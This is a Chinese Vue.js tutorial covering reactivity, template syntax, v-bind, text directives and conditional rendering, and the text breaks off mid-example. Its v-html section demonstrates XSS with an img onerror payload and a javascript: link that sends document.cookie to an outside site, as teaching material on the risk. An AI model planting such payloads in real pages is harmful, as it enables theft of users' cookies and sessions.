# Vue 基础语法

## 一.Vue 背后的真相

### Vue2 的数据双向绑定原理

```vue
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Vue2 数据双向绑定原理</title>
  <script !src="vue.js"></script>
</head>
<body>
  <div id="box">
    <script >
      // 创建一个空对象
      var obj = {};

      // 使用 Object.defineProperty 方法在 obj 对象上定义属性 name，并传入属性描述符对象
      Object.defineProperty(obj, "name", {
        // 定义 get 方法，当读取 obj.name 时触发
        get() {
          console.log("get"); // 打印 "get"
          return box.innerHTML; // 返回 box 元素的内容
        },
        // 定义 set 方法，当给 obj.name 赋值时触发
        set(value) {
          console.log("set", value); // 打印 "set" 和传入的值 value
          box.innerHTML = value; // 将传入的值设置为 box 元素的内容
        },
      });

    </script>
  </div>
</body>
</html>
```

这段代码中我们使用了 JavaScript 中的 `Object.defineProperty` 方法来定义一个对象的属性，实现Vue数据的双向绑定。Vue 使用类似的原理来追踪数据的变化，并在数据被读取或修改时执行相应的操作。

这里我们使用了属性描述符对象的两个方法：`get` 和 `set`。

- `get()` 方法是一个访问器函数。当代码读取 `obj.name` 时，这个函数将被触发。在这个例子中，它打印了 "get" 并返回 `box.innerHTML` 的值。`box.innerHTML` 是 HTML 页面中的某个元素的内容。
- `set(value)` 方法也是一个访问器函数。当代码给 `obj.name` 赋值时，这个函数将被触发。它打印了 "set" 以及传入的值 `value`，并将该值赋给 `box.innerHTML`，从而更新页面中相应元素的内容。

这段代码的效果是，当你读取 `obj.name` 属性时，会打印 "get" 并返回 `box.innerHTML` 的值；当你给 `obj.name` 赋值时，会打印 "set" 并更新 `box.innerHTML` 的内容。

这个代码其实是有一定缺陷的,只能拦截单个对象的属性，而对于复杂嵌套对象的拦截，可能需要使用递归或循环来处理,而且只能检测某个对象,如果是数组改了,它检测不到。

### Vue 3 的数据双向绑定原理

```vue
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Vue3 数据数据双向绑定原理</title>
</head>
<script src="vue.js"></script>
<body>
<div id="box"></div>
<script>
  // 创建一个空对象
  var obj = {};

  // 创建 Proxy 对象
  var vm = new Proxy(obj, {
    // 在属性被访问时触发的回调函数
    get(target, key) {
      console.log('get');
      return target[key];
    },

    // 在属性被赋值时触发的回调函数
    set(target, key, value) {
      console.log('set');
      target[key] = value;
      box.innerHTML = value;
    }
  });

</script>
</body>
</html>
```

在Vue3 中使用ES6`Proxy`方法,在上面的代码中

1. 我们先创建一个空对象 `obj`，它将作为被代理对象。
2. 使用 `Proxy` 对象创建了一个代理对象 `vm`，该对象用于拦截对 `obj` 对象的访问和赋值操作。
3. 当代理对象的属性被访问时，`get` 回调函数会被触发。在这个代码片段中，回调函数打印了 "get" 的消息，并返回被访问属性的值。
4. 当代理对象的属性被赋值时，`set` 回调函数会被触发。在这个代码片段中，回调函数打印了 "set" 的消息，并将属性设置为指定的值。此外，它还将赋值的值更新到 `box.innerHTML` 中，将其显示在一个元素（具有 `id="box"` 的 `<div>`）中。

通过使用 `Proxy` 对象，可以在对 `obj` 对象进行属性访问和赋值时插入自定义的逻辑。在这个例子中，我们利用 `Proxy` 对象拦截了属性的访问和赋值操作，并在控制台打印相应的消息。

首先当我们控制台访问`obj.a` 并没有实现拦截,但是对应的值改变了

<img src="https://billy.taoxiaoxin.club/md/2023/06/6480a075922ee483c3eb18cd.png" alt="image-20230607232125073" style="zoom:50%;" />

所以这里必须访问的是`vm.a`实现拦截,通过访问代理才能够影响到我们的原始对象

![image-20230607232458524](https://billy.taoxiaoxin.club/md/2023/06/6480a14a922ee483d45d4389.png)

在 Vue 2 中，Vue 实例的响应式属性是**通过使用 `Object.defineProperty` 方法进行定义和拦截的**。具体而言，**需要在对象上明确声明要响应式跟踪的属性，并且这些属性必须在对象创建时就存在，后续添加的属性是无法被响应式系统自动拦截的。**

例如，在 Vue 2 中，如果要使对象的属性是响应式的，需要在创建对象时就将属性初始化，并通过 `Vue.set` 或者数组的变异方法（如 `push`、`pop`、`splice` 等）来添加或修改属性。

而在 Vue 3 中，使用了 **ES6 中的 `Proxy` 对象来实现响应式**。**`Proxy` 对象可以拦截对整个对象的访问和修改，不再需要明确声明要拦截的属性。这意味着在 Vue 3 中，所有属性的访问和修改都可以被代理对象捕获，即使这些属性是后期添加的。所以它代理的是整个对象。**能够直接监听数组的变化。

Vue 3 的这种改进带来了更强大和灵活的响应式系统，减少了手动声明和维护响应式属性的工作量，并且可以更准确地追踪对象的变化。它为开发者提供了更好的开发体验和更高的效率。

在Vue3 中,为了防止某些浏览器不支持ES6 Proxy ,Vue作者在源码中放置了2套方案,如果不支持,就走Vue 2 的 `Object.defineProperty` 方法.反之优先使用ES6 中的 `Proxy`。

## 二、Mustache语法（模板语法）

语法格式：`{{}}`

首先我们可以来看下面的代码：

```vue
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Vue 模板语法</title>
    <script src="vue.js"></script>
</head>
<body>
<div id="app">
  <h2>{{ message }}</h2>
  <h2>{{ message }}, shawn!</h2>

  <!-- mustache 语法中，不仅仅可以直接写变量，也可以写简单的表达式 -->
  <h2>{{ firstName + ' ' + lastName }}</h2>
  <h2>{{ firstName }} {{ lastName }}</h2>
  <h2>计算结果: {{ counter * 2 }}</h2>
  <h2>三目运算符：{{ 10 > 20 ? '是' : '否' }}</h2>
  <h2>三目运算符,登录状态: {{ isLogin ? '已登录' : '未登录' }}</h2>
  <h2>字符串: {{ link1 }}</h2>
  <h2>函数调用: {{ firstName.slice(0, 1) }}</h2>
</div>
<script>
  // 创建一个包含 data 方法的对象
  var obj = {
    data() {
      return {
        message: '你好啊',
        firstName: 'dog',
        lastName: 'dunk',
        counter: 100,
        isLogin: true,
        link1: '<a href="https://www.baidu.com">百度一下 你就知道</a>'
      };
    }
  };

  // 使用 Vue.createApp 方法创建 Vue 应用，并挂载到 id 为 "app" 的元素上
  Vue.createApp(obj).mount("#app");
</script>
</body>
</html>
```

在上面的代码中我们使用了最基本的数据绑定形式是**文本插值**，它使用的是“Mustache”语法 (即双大括号),通过插值将数据动态地显示在 HTML 模板中，文本插值中可以包含字符串、表达式、计算、函数调用等功能,文本插值不支持复杂的控制流程和条件逻辑，如 `if` 判断、循环和定义变量等。

## 三、动态绑定属性

| 指令   | 释义                           |
| ------ | ------------------------------ |
| v-bind | 直接写js的变量或语法（不推荐） |
| :      | 直接写js的变量或语法（推荐）   |

`v-bind`作用：动态绑定属性

### 3.1 v -bind 基本使用

有时候某些属性我们也希望动态来绑定。比如动态绑定a元素的href属性,也可以动态绑定img元素的src属性,这个时候，我们可以使用v-bind指令：

```vue
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Vue 动态绑定属性</title>
  <script src="vue.js"></script>
  <style>
    .red{
      background-color: red;
    }
    .yellow{
      background-color: yellow;
    }
  </style>
</head>
<body>
<div id="app">
  <!-- 错误的做法: 这里不可以使用文本插值语法 -->
  <!--<img src="{{imgURL}}" alt="">-->

  <!-- 正确的做法: 使用v-bind指令 -->
  <p><img v-bind:src="imgURL" alt="" width="200"></p> <!-- 使用v-bind指令绑定imgURL到src属性 -->
  <p><a v-bind:href="aHref">百度一下</a></p> <!-- 使用v-bind指令绑定aHref到href属性 -->
  <p><div v-bind:class="color">动态变色</div></p> <!-- 使用v-bind指令绑定color到class属性 -->
  <p><div v-bind:class="isLogin?'red':'yellow'">22222222</div></p> <!-- 使用v-bind指令绑定条件类名，根据isLogin的值动态切换类名 -->

  <!-- 语法糖的写法 -->
  <p><img :src="imgURL" alt=""></p> <!-- 使用语法糖形式绑定imgURL到src属性 -->
  <p><a :href="aHref">百度一下</a></p> <!-- 使用语法糖形式绑定aHref到href属性 -->
  <p><div :class="color">动态变色</div></p> <!-- 使用语法糖形式绑定color到class属性 -->
  <p><div :class="isLogin?'red':'yellow'">22222222</div></p> <!-- 使用语法糖形式绑定条件类名 -->
  <p><button :disabled="isDisabled">click</button></p> <!-- 使用语法糖形式绑定isDisabled到disabled属性 -->

  <!-- 动态绑定多个值 -->
  <p> <img v-bind="imgObj"></p> <!-- 使用v-bind指令将imgObj对象的属性绑定到img标签上 -->


</div>

<script>
  var obj = {
    data() {
      return {
        imgURL: 'https://img11.360buyimg.com/mobilecms/s350x250_jfs/t1/20559/1/1424/73138/5c125595E3cbaa3c8/74fc2f84e53a9c23.jpg!q90!cc_350x250.webp',
        // 图片URL变量
        aHref: 'http://www.baidu.com',
        // 链接变量
        color: 'red',
        // 颜色变量
        isLogin: false,
        // 登录状态变量
        isDisabled: false,
        // 按钮是否禁用变量，除了false之外的值都是禁用的
        imgObj: {
          src: 'https://img11.360buyimg.com/mobilecms/s350x250_jfs/t1/20559/1/1424/73138/5c125595E3cbaa3c8/74fc2f84e53a9c23.jpg!q90!cc_350x250.webp',
          width: 100
          // 图片宽度变量
        }
      }
    }
  }
  // 创建Vue应用并挂载到元素上
  Vue.createApp(obj).mount("#app");
</script>
</body>
</html>
```

在 Vue 的 HTML 模板中，当需要绑定属性时，应使用 `v-bind` 指令（或简化的语法糖 `:`），而不是双大括号（插值语法）。双大括号只适用于文本内容的插值，而不能在 HTML 属性中使用。

通过 `v-bind` 指令，我们可以实现属性的响应式绑定，将 Vue 实例的数据动态地绑定到 HTML 元素的属性上。在示例代码中，我们可以看到多个使用 `v-bind` 指令绑定属性的例子：

- `<img v-bind:src="imgURL" alt="" width="200">`：将 `imgURL` 的值绑定到 `src` 属性，实现图片的动态加载。
- `<a v-bind:href="aHref">百度一下</a>`：将 `aHref` 的值绑定到 `href` 属性，实现超链接的动态跳转。
- `<div v-bind:class="color">动态变色</div>`：将 `color` 的值绑定到 `class` 属性，实现动态改变元素的样式类。
- `<div v-bind:class="isLogin ? 'red' : 'yellow'">22222222</div>`：根据 `isLogin` 的值动态切换元素的样式类为 `red` 或 `yellow`。

同时，我们也可以使用简化的语法糖 `:` 来代替 `v-bind`，例如 `<img :src="imgURL" alt="">` 等同于 `<img v-bind:src="imgURL" alt="">`。

需要注意的是，Vue 的属性绑定是响应式的，当数据发生变化时，绑定的属性会自动更新。这使得我们可以根据数据的变化动态修改元素的属性，实现交互和状态管理。

此外，示例代码还展示了动态绑定多个属性的情况。通过使用 `v-bind` 指令将一个对象作为参数传递给属性，我们可以同时绑定对象中的多个属性。在代码中，我们使用 `<img v-bind="imgObj">` 将 `imgObj` 对象中的属性动态绑定到 `<img>` 标签上。

此外，`v-bind` 指令还支持使用表达式。我们可以在绑定属性时使用 JavaScript 表达式来动态计算属性的值。例如：

- `{{ number + 1 }}`：在绑定中使用表达式 `number + 1`，实现属性值的动态计算。
- `{{ ok ? 'YES' : 'NO' }}`：使用条件表达式来确定属性值是 'YES' 还是 'NO'。
- `{{ message.split('').reverse().join('') }}`：通过表达式对 `message` 进行字符串反转操作。

另外，`v-bind` 指令还支持动态生成属性名称。我们可以使用字符串拼接或模板字符串的方式动态生成属性名称。例如：

- `<div :id="'list-' + id"></div>`：使用字符串拼接方式生成具有动态属性名称的 `id` 属性。
- `<div :id="`list-${id}`"></div>`：使用模板字符串方式生成具有动态属性名称的 `id` 属性。

综上所述，`v-bind` 指令不仅可以将属性与 Vue 实例的数据绑定，还支持表达式的使用和动态生成属性名称，使得属性的绑定更加灵活和动态。通过这种方式，我们可以实现更高级的属性绑定需求和交互效果。

### 3.2 V -bind 魔法糖

v-bind有一个对应的语法糖，也就是简写方式

简写方式：`:`

### 3.3 数据的绑定

数据绑定是 Vue 中的核心概念之一，用于将数据与 HTML 元素的属性、样式等进行关联。Vue 提供了多种方式来实现数据的绑定，包括属性绑定和样式绑定。

#### 3.3.1 属性绑定

属性绑定可以通过 `v-bind` 指令（或语法糖 `:`）实现，语法为 `:属性名="js变量或js表达式"`。

- 单个属性绑定：使用 `v-bind` 将指定的属性与一个 Vue 实例的数据进行绑定，属性的值会随着数据的变化而更新。

  示例：

  ```html
  <img :src="imgURL" alt="">
  ```

- 在上述代码中，`:src` 将 `imgURL` 变量的值绑定到 `src` 属性，实现动态加载图片的效果。

- 动态生成属性名称：可以使用字符串拼接或模板字符串的方式动态生成属性名称。

  示例：

  ```html
  <div :id="'list-' + id"></div>
  ```

  使用字符串拼接方式生成具有动态属性名称的 `id` 属性。

  示例：

  ```html
  <div :id="`list-${id}`"></div>
  ```

  使用模板字符串方式生成具有动态属性名称的 `id` 属性。

- 表达式的使用：可以在绑定属性时使用 JavaScript 表达式来动态计算属性的值。

  示例：

  ```html
  {{ number + 1 }}
  ```

  在绑定中使用表达式 `number + 1`，实现属性值的动态计算。

  示例：

  ```vue
  {{ ok ? 'YES' : 'NO' }}
  ```

  使用条件表达式来确定属性值是 'YES' 还是 'NO'。

#### 3.3.2 样式绑定

样式绑定可以通过 `v-bind` 指令将一个对象、数组或字符串与元素的 `class` 或 `style` 属性关联起来。

- 对象语法：可以将一个对象的属性与 `class` 或 `style` 属性进行绑定，属性的值决定了样式是否生效。

以下是一段举例代码:

```vue
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <script src="vue.js"></script>
    <style>
        /* 样式类定义 */
        .box1 {
            color: red;
            border: 1px solid #000;
        }

        .box2 {
            background-color: orange;
            font-size: 32px;
        }

        .box4 {
            background-color: red;
        }

        .box5 {
            color: green;
        }

        .box6 {
            background-color: red;
        }

        .box7 {
            color: green;
        }

        .box8 {
            border: 1px solid yellow;
        }
    </style>
</head>
<body>
    <div id="box">
        <!-- 使用v-bind指令绑定class -->
        <p :class="{box1: myclass1}">一个段落</p>
        <p @click="myclass3=!myclass3" :class="{box1: myclass2, box2: myclass3}">一个段落</p>
    </div>

    <div id="app">
        <!-- 通过按钮点击事件修改样式类变量 -->
        <button @click="mycls.box4=!mycls.box4">改变背景</button>
        <button @click="mycls.box5=!mycls.box5">改变字体颜色</button>
        <!-- 使用动态绑定的样式类对象 -->
        <p :class="mycls">第二个段落</p>
    </div>

    <div id="app2">
        <!-- 使用数组语法绑定多个样式类 -->
        <p :class="[mycls1, mycls2]">第三个段落</p>
    </div>

    <script>
        // 创建 Vue 实例并进行挂载
        Vue.createApp({
            data() {
                return {
                    // 数据变量
                    myclass1: false,
                    myclass2: true,
                    myclass3: false,
                    mycls: {
                        box4: false,
                        box5: true
                    },
                    mycls1: {
                        box6: true,
                        box7: true
                    },
                    mycls2: {
                        box8: true
                    }
                };
            },
            methods: {
                // 点击事件处理方法，切换样式类变量
                toggleClass1() {
                    this.myclass1 = !this.myclass1;
                },
                toggleClass2() {
                    this.myclass2 = !this.myclass2;
                }
            }
        }).mount('#box'); // 将实例挂载到指定的DOM元素上

        Vue.createApp({
            data() {
                return {
                    mycls: {
                        box4: false,
                        box5: true
                    }
                };
            }
        }).mount('#app');

        Vue.createApp({
            data() {
                return {
                    mycls1: {
                        box6: true,
                        box7: true
                    },
                    mycls2: {
                        box8: true
                    }
                };
            }
        }).mount('#app2');
    </script>
</body>
</html>

```

这段代码主要涉及使用 Vue 实例的数据和方法来控制标签的 class 类名。

1. 在 `#box` 内部的段落标签 `<p>` 中，使用 `v-bind` 指令绑定了 `myclass1` 变量到 `class` 属性上。当 `myclass1` 为 `true` 时，会添加 `box1` 样式类，实现红色字体和黑色边框的效果。
2. 第二个段落标签 `<p>` 使用了点击事件 `@click`，当点击时会触发 `toggleClass1` 方法。同时使用 `v-bind` 指令将 `myclass2` 和 `myclass3` 变量绑定到 `class` 属性上。`myclass2` 为 `true` 时，添加 `box1` 样式类；`myclass3` 为 `true` 时，添加 `box2` 样式类。通过点击事件切换这两个变量的值，可以实现点击切换样式的效果。
3. 在 `#app` 内部，使用按钮绑定了点击事件，分别触发了 `toggleClass2` 方法来修改 `mycls.box4` 和 `mycls.box5` 的值。同时，使用 `v-bind` 指令将 `mycls` 对象作为 `class` 属性的值，实现动态绑定样式类的效果。`mycls.box4` 为 `true` 时，会添加 `box4` 样式类；`mycls.box5` 为 `true` 时，会添加 `box5` 样式类。通过按钮点击可以改变背景颜色和字体颜色。
4. 在 `#app2` 内部，使用 `v-bind` 指令将两个对象 `mycls1` 和 `mycls2` 组合成数组作为 `class` 属性的值。这样可以同时绑定多个样式类，实现多个样式的叠加效果。在示例中，`box6` 和 `box7` 样式类会同时生效，而 `box8` 样式类也会被应用到段落标签上。

通过以上代码，我们可以灵活地控制标签的 class 类名，实现动态的样式变化和样式叠加效果。

![image-20230614212242923](https://billy.taoxiaoxin.club/md/2023/06/6489bf23922ee4b97aece3f2.png)

## 四、文本指令

|  指令  |                             释义                             |
| :----: | :----------------------------------------------------------: |
| v-once | 元素和组件(组件后面才会学习)只渲染一次，不会随着数据的改变而改变 |
| v-html |                       让HTML渲染成页面                       |
| v-text |                  标签内容显示js变量对应的值                  |
| v-show |       放1个布尔值：为真 标签就显示；为假 标签就不显示        |
|  v-if  |       放1个布尔值：为真 标签就显示；为假 标签就不显示        |

>v-show与 v-if的区别：
>
>+ v-show：标签还在，只是不显示了（display: none）
>+ v-if：直接操作DOM，删除/插入 标签

#### v-html：让HTML渲染成页面

+ 该指令后面往往会跟上一个string类型
+ 会将string的html解析出来并且进行渲染

当我们从服务器请求到的数据本身就是 HTML 代码时，有时我们希望以 HTML 格式进行解析并显示对应的内容。这种情况常见于行业动态、新闻资讯、博客等网站，用户通常希望以 HTML 的格式展示内容。在这种情况下，直接使用双大括号插值表达式 `{{}}` 输出数据会将 HTML 代码作为纯文本显示，无法进行解析和渲染。

为了解决这个问题，Vue 提供了 `v-html` 指令。通过使用 `v-html` 指令，我们可以将绑定的数据作为 HTML 解析，并将其渲染到页面上，以呈现出对应的样式和结构。

下面是一个更详细的示例，演示如何使用 `v-html` 指令来展示从服务器获取的包含 HTML 代码的数据：

```vue
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>v-html 简单举例</title>
  <script src="vue.js"></script>
</head>

<body>
  <div id="box">
    <!-- 使用双大括号插值表达式展示原始的 HTML 代码 -->
    {{myhtml}}

    <p>以下为使用 v-html 指令渲染的内容：</p>
    <!-- 使用 v-html 指令渲染包含 HTML 代码的数据 -->
    <div v-html="myhtml"></div>
  </div>

  <script>
    var obj = {
      data() {
        return {
          myhtml: '' // 从服务器请求到的包含 HTML 代码的数据
        }
      }
    }

    var app = Vue.createApp(obj).mount("#box");

    // 模拟从服务器获取 HTML 代码的数据
    setTimeout(() => {
      app.myhtml = `<p>　　近日，中科软科技股份有限公司(简称：中科软科技)郑州乐驰软件科技有限公司(简称：郑州乐驰)、河南晟盾电子科技有限公司(简称：河南晟盾)三家公司面试官莅临<a href="http://www.mobiletrain.org/?pinzhuanbdtg=biaoti" target="_blank">千锋教育</a>郑州分校招聘人才。此次<a href="http://www.mobiletrain.org/smzp/?pinzhuanbdtg=biaoti" target="_blank">上门招聘</a>的岗位有Java开发和前端开发，共三十余个岗位。上门招聘的企业面试官为学员详细介绍了公司的发展历程和招聘岗位，会后基于对此次招聘企业的认可，学员纷纷投上简历，进行了逐一面试。面试官对学员们的面试表现和技术掌握程度表示了充分认可，千锋教育培养的人才充满信心。</p><p><img src="http://upload.mobiletrain.org/2022/0307/1646620780762.png" alt="图片1"/></p><p>千锋教育郑州分校上门招聘现场一</p><p><img src="http://upload.mobiletrain.org/2022/0307/1646620789802.png" alt="图片2"/></p><p>千锋教育郑州分校上门招聘现场二</p><p>　　据悉，此次上门招聘的企业均与千锋教育有过人才招聘合作，尤其中科软科技更是与千锋教育有多年的合作关系，中科软科技股份有限公司成立于1996年，2000年10月经国家经贸委、财政部和中国科学院批复改制成为股份有限公司。中科软科技依托中国科学院雄厚的人才优势和先进的科研成果，二十多年来一直活跃在中国行业信息化建设的前列，是从事计算机软件研发、应用、服务的大型专业化高新技术企业。公司以行业应用软件开发为核心，业务涵盖应用软件、支撑软件、系统集成等应用层次，可为客户提供大型行业应用解决方案。经过多年的发展，公司现已将行业应用软件产品和解决方案应用扩展至众多行业领域，并已在保险信息化以及公共卫生信息化行业细分应用领域形成优势，在政务信息化行业应用领域具有丰富经验。</p><p>　　站在广阔的平台上，才会有更好的个人发展，千锋教育一直积极与业内优秀企业合作，开展企业上门招聘活动，为学员提供进入优秀企业的通道。与此同时，千锋教育还打造了完善的就业服务方案，每年组织全国大小双选会20余场，企业直推就业占比45%，企业直推入职率超50%，遍布全国的20000余家合作企业网络和全国18城22个教学中心就业资源共享，为学员提供了更为丰富的就业选择和较高的起点。</p><p><br/></p>`;
    }, 2000); // 模拟延迟获取数据，以展示异步请求的情况

  </script>
</body>

</html>

```

![image-20230614195820938](https://billy.taoxiaoxin.club/md/2023/06/6489ab5d922ee4b74a0ef25b.png)

看了上面的代码你是不是觉得很简单,以后凡是普通的纯文本用模板语法就好了,凡是带代码片段的用`v-html`指令渲染出来就好了.

但是事实上,如果返回的数据中有script标签,它会立马执行标签里面的内容,这样很容易⾮常容易造成 XSS 漏洞

这里我们先来举个简单的例子:

```vue
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>XSS攻击示例</title>
  <script src="vue.js"></script>
</head>

<body>
<div id="app">
  <!-- 用户输入的姓名 -->
  <form @submit.prevent="submitForm">
    <label for="name">姓名：</label>
    <input type="text" id="name" v-model="name">
    <button type="submit">提交</button>
  </form>

  <!-- 显示欢迎消息 -->
  <h2>欢迎，{{ name }}</h2>
  <div v-html="name"></div>
</div>

<script>
  var app = Vue.createApp({
    data() {
      return {
        name: ''
      };
    },
    methods: {
      submitForm() {
        // 这里假设用户输入的内容是恶意代码
        var maliciousCode = '<img src="x" onerror="alert(\'恶意代码注入\');">';

        // 模拟攻击：直接将恶意代码赋值给name变量
        this.name = maliciousCode;
      }
    }
  });

  app.mount("#app");
</script>
</body>
</html>

```

在这个示例中，用户可以输入姓名，并通过`v-model`指令将输入的内容绑定到`name`变量上。在提交表单时，我模拟了一个潜在的 XSS 攻击，将带有恶意代码的字符串赋值给`name`变量。由于使用了`v-html`指令将`name`变量的值渲染为 HTML，恶意代码将被解析并触发 `onerror` 事件，从而弹出一个警示框。

![image-20230614204619223](https://billy.taoxiaoxin.club/md/2023/06/6489b69b922ee4b834f0f2f0.png)

看完上面的例子,我们再来看个例子:

```vue
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>V-HTML 的陷阱</title>
    <script src="vue.js"></script>
</head>
<body>
<div id="box">
  {{mydangerhtml}}

  <div v-html="mydangerhtml"></div>
</div>
<script>
  var obj = {
    data(){
      return {
        mydangerhtml:`<a href=javascript:location.href='http://www.baidu.com?cookie?'+document.cookie>男人看了沉默,女人看了流泪</a>`,
      }
    }
  }
  var app = Vue.createApp(obj).mount("#box")
</script>
</body>
</html>
```

上面的代码中的`mydangerhtml`变量包含了一个恶意的HTML代码，通过`<a>`标签中的`href`属性来执行JavaScript代码。通过这段代码获取用户的Cookie信息并发送到恶意的网站,造成用户的隐私泄露。

所以当涉及动态渲染 HTML 内容时，需要谨慎处理以防止 XSS（跨站脚本）漏洞的出现。尽管在一般情况下，使用模板语法来渲染纯文本是安全的，而使用 `v-html` 指令来渲染包含代码片段的 HTML 是方便的，但是需要注意以下几点：

1. **潜在的危险：** 如果返回的数据中包含 `<script>` 标签，那么浏览器会立即执行脚本中的内容。这样做可能会导致恶意代码注入和执行，从而引发 XSS 漏洞，危害用户和网站的安全。
2. **谨慎使用 `v-html`：** 为了防止潜在的安全风险，应该仅在内容是安全可信的情况下使用 `v-html` 指令。确保您从受信任的源或可靠的数据来源获取 HTML 内容，而不是直接接受用户提供的 HTML。
3. **数据验证和过滤：** 在接收到用户输入或从外部源获取 HTML 内容之前，进行数据验证和过滤。通过使用专门的安全库，如 DOMPurify，对 HTML 内容进行验证和过滤，以确保只允许安全的标签和属性，并过滤掉潜在的恶意代码。
4. **限制 HTML 内容的来源：** 为了增加安全性，应尽量限制 HTML 内容的来源，并仅允许从受信任的源获取或使用预定义的、经过验证的模板。这样可以降低受到攻击的风险。

总结起来，尽管使用模板语法和 `v-html` 指令可以简化渲染纯文本和动态 HTML 内容的过程，但动态渲染任意 HTML 内容存在安全风险，尤其是当渲染的内容来自不受信任的源或用户输入时。因此，只有在内容是安全可信的情况下才能使用 `v-html`，并且需要采取适当的安全措施，如数据验证、过滤、限制来源，以确保用户和系统的安全。

#### v-once  :只渲染一次，不会随数据的改变而改变

+ 在某些情况下，我们可能不希望界面随意的跟随改变
+ 这个时候,我们就可以使用一个Vue的指令:`v-once `

```vue
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>v-once指令</title>
  <script src="../js/vue.js"></script>
</head>
<body>

<div id="app">
    <h2>{{message}}</h2>
    <h2 v-once>{{message}}</h2>
</div>
<script>
    const app = new Vue({
        el: '#app',
        data: {
            message: '你好啊'
        }
    })
</script>

</body>
</html>
```

![image-20210427155914941](https://billy.taoxiaoxin.club/md/2023/06/6480735f922ee47d9dc6c526.png)



#### v-text：标签内容显示js变量对应的值

+ v-text作用和Mustache比较相似：都是用于将数据显示在界面中

```python
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Title</title>
</head>
<body>

<div id="app">
  <h2>{{message}}, shawn!</h2>
  <h2 v-text="message">, 爸爸打我!</h2>
</div>

<script src="../js/vue.js"></script>
<script>
  const app = new Vue({
    el: '#app',
    data: {
      message: '你好啊'
    }
  })
</script>

</body>
</html>
```

![image-20210427161537200](https://billy.taoxiaoxin.club/md/2023/06/6480735f922ee47d9fe5ca1c.png)



#### v-pre

+ v-pre用于跳过这个元素和它子元素的编译过程，用于显示原本的Mustache语法。

```python
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Title</title>
</head>
<body>

<div id="app">
  <h2>{{message}}</h2>
  <h2 v-pre>{{message}}</h2>
</div>

<script src="../js/vue.js"></script>
<script>
  const app = new Vue({
    el: '#app',
    data: {
      message: '你好啊'
    }
  })
</script>

</body>
</html>
```

![image-20210427163031044](https://billy.taoxiaoxin.club/md/2023/06/6480735f922ee47da03e7276.png)

#### v-cloak

+ 在某些情况下，我们浏览器可能会直接显然出未编译的Mustache标签。

```python
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Title</title>
  <style>
    [v-cloak] {
      display: none;
    }
  </style>
</head>
<body>

<div id="app" v-cloak>
  <h2>{{message}}</h2>
</div>

<script src="../js/vue.js"></script>
<script>
  // 在vue解析之前, div中有一个属性v-cloak
  // 在vue解析之后, div中没有一个属性v-cloak
  setTimeout(function () {
    const app = new Vue({
      el: '#app',
      data: {
        message: '你好啊'
      }
    })
  }, 1000)
</script>

</body>
</html>
```

#### v-show：显示/隐藏内容

```python
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>v-show</title>
    <script src="https://cdn.bootcdn.net/ajax/libs/vue/2.6.12/vue.min.js"></script>
</head>
<body>

<div id="box">
    <h3>案例：控件通过按钮来控制显示和小事</h3>
    <button @click="handleClick()">点我</button>
    <br>
    <div v-show="isShow">isShow</div>
</div>

</body>
<script>
    let vm = new Vue({
        el: '#box',
        data: {
            isShow: true,
        },
        methods: {
            handleClick(){
              this.isShow = !this.isShow    // this指的是当前的vue对象
            },
        }
    })
</script>
</html>
```

![img](https://billy.taoxiaoxin.club/md/2023/06/6480735f922ee47da1b1e707.gif)

## 五、条件指令

### 5.1 条件指令

Vue中的条件指令用于根据特定的条件在DOM中显示或隐藏元素。这些条件指令包括v-if、v-else-if和v-else。

1. v-if：v-if指令用于根据条件决定是否渲染DOM元素。**它接受一个表达式作为参数，只有当该表达式的值为真时，才会渲染对应的元素。**如果表达式的值为假，则对应的元素会从DOM中移除。 示例：

   ```vue
   <div v-if="isVisible">我是可见的</div>
   ```

   在上面的示例中，只有当`isVisible`为真时，才会渲染该div元素。

2. v-else-if：v-else-if指令用于在v-if指令的条件不满足时，根据另一个条件进行判断。**它必须紧跟在v-if或v-else-if指令后面**，并且接受一个表达式作为参数。如果前面的条件不满足，且当前的条件为真，则对应的元素会渲染出来。 示例：

   ```vue
   <div v-if="isCondition1">条件1满足</div>
   <div v-else-if="isCondition2">条件2满足</div>
   ```

   在上面的示例中，如果`isCondition1`为真，则渲染第一个div元素；如果`isCondition1`为假且`isCondition2`为真，则渲染第二个div元素。

3. v-else：v-else指令用于在前面的条件都不满足时，渲染一个默认的元素。**它必须紧跟在v-if或v-else-if指令后面**，不需要传递任何参数。 示例：

   ```vue
   <div v-if="isCondition1">条件1满足</div>
   <div v-else-if="isCondition2">条件2满足</div>
   <div v-else>条件都不满足</div>
   ```

   在上面的示例中，如果前面的条件都不满足，则渲染最后一个div元素。

   这些条件指令可以根据不同的条件来控制DOM元素的显示与隐藏，使我们能够根据动态的数据来动态渲染页面。同时，Vue还提供了`v-show`指令，用于根据条件来切换元素的显示与隐藏，但它不会从DOM中移除元素，只是通过修改CSS样式来控制元素的可见性。

### 5.2 条件渲染案例

案例一:展示今天是星期几

```vue
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>案例一:展示今天是星期几</title>
  <script src="vue.js"></script>
</head>
<body>

<div id="card">
  <!-- 使用条件指令根据num的值显示相应的星期几 -->
  <li v-if="num==1">星期一</li>
  <li v-else-if="num==2">星期二</li>
  <li v-else-if="num==3">星期三</li>
  <li v-else-if="num==4">星期四</li>
  <li v-else-if="num==5">星期五</li>
  <li v-else-if="num==6">星期六</li>
  <li v-else>星期天</li>
</div>
<script>
  var obj = {
    data() {
      return {
